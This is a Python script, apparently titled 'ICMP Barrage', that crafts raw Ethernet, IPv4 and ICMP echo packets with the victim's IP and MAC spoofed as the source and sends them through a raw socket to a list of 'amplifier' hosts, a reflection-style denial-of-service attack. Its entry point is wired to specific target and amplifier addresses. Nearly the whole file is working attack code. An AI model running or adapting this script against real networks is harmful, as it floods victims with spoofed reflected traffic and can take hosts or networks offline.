#!/usr/bin/env python3
import os
import socket
import struct
import time
from sys import byteorder
from binascii import crc32, unhexlify

def compute_checksum(data):
	''' Compute the checksum of an IP packet '''
	# sum the data as a series of 16-bit integers
	acc = sum([int(data[i:i+2].hex(), 16) for i in range(0, len(data), 2)])
	# add carry
	acc = (acc >> 16) + (acc & 0xffff)
	acc += (acc >> 16)
	# return the one's complement of the sum
	return (~acc) & 0xffff

def construct_ICMP_packet():
	''' Construct the core ICMP payload '''
	ping_type = 0x08
	ping_code = 0x00
	identifier = os.getpid() & 0xffff
	sequence = 1
	data = b'x' * 48
	t = int(time.time())
	# serialize data with zeroed out checksum field
	ser = ping_type.to_bytes(1, 'big') + ping_code.to_bytes(1, 'big') + b'\x00\x00' + identifier.to_bytes(2, 'big') + sequence.to_bytes(2, 'big') + t.to_bytes(8, 'little') + data
	# compute checksum
	checksum = compute_checksum(ser)
	# serialize ICMP packet with computed checksum
	return struct.pack("!BBHHH", ping_type, ping_code, checksum, identifier, sequence) + t.to_bytes(8, 'little') + data

def construct_IP_packet(src, dest, icmp):
	''' Construct an IPv4 packet '''
	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
	tos = 0x00
	length = 0x54
	ident = os.getpid() & 0xffff
	flags = 0x40
	ttl = 0x40 # ttl set to 64
	protocol = 0x01 # set to IP protocol 1 (ICMP)
	header_chksm = 0x00 # compute header checksum
	source_ip = socket.inet_aton(src)
	dest_ip = socket.inet_aton(dest)
	serialized = v_ihl.to_bytes(1, byteorder) + tos.to_bytes(1, byteorder) + length.to_bytes(2, byteorder) + ident.to_bytes(2, byteorder) + flags.to_bytes(2, byteorder) + ttl.to_bytes(1, byteorder) + protocol.to_bytes(1, byteorder) + header_chksm.to_bytes(2, byteorder) + source_ip + dest_ip + icmp
	checksum = compute_checksum(serialized)
	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, checksum, source_ip, dest_ip) + icmp

def construct_ETH_packet(dest, src):
	''' Construct an ethernet packet '''
	return dest + src + b'\x08\x00'

def print_header(target):
	''' Print headers to the ICMP Barrage program '''
	title = "  __  ___  _  _  ____    ____   __   ____  ____   __    ___  ____ \n (  )/ __)( \/ )(  _ \  (  _ \ / _\ (  _ \(  _ \ / _\  / __)(  __)\n  )(( (__ / \/ \ ) __/   ) _ (/    \ )   / )   //    \( (_ \ ) _) \n (__)\___)\_)(_/(__)    (____/\_/\_/(__\_)(__\_)\_/\_/ \___/(____)\n"
	#print(title)
	print(f' Orchestrating barrage on {target}...\n')

def icmp_barrage(target, target_mac, amplifiers, amplifier_macs):
	''' Send ping packets to the relays with source IP spoofed '''
	# create a raw socket
	sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	# bind socket to wireless interface
	sock.bind(("wlp2s0", 0))
	# craft ICMP datagram
	icmp_payload = construct_ICMP_packet()
	# print ICMP barrage headers
	print_header(target)
	# iterate through amplifiers
	for idx, dest in enumerate(amplifiers):
		for i in range(3):
			print(f'Launching packet {i}', end="\r")
			# craft an IP packet with the victim's source IP and amplifier's destination IP
			ip_packet = construct_IP_packet(target, dest, icmp_payload)
			#print(f'Len IP: {len(ip_packet)}')
			# construct spoofed ethernet 2 frame
			ether = construct_ETH_packet(amplifier_macs[idx], target_mac)
			# append ICMP payload to IP header
			packet = ether + ip_packet
			#checksum = crc32(packet)
			#packet += checksum.to_bytes(4, byteorder)
			# send malicious packet to the amplifier
			sock.send(packet)

if __name__ == "__main__":
	icmp_barrage('192.168.1.62', b'\xd4\x6d\x6d\x2b\x26\xc2', ['192.168.1.64'], [b'\x08\x11\x96\x19\xbe\xec'])
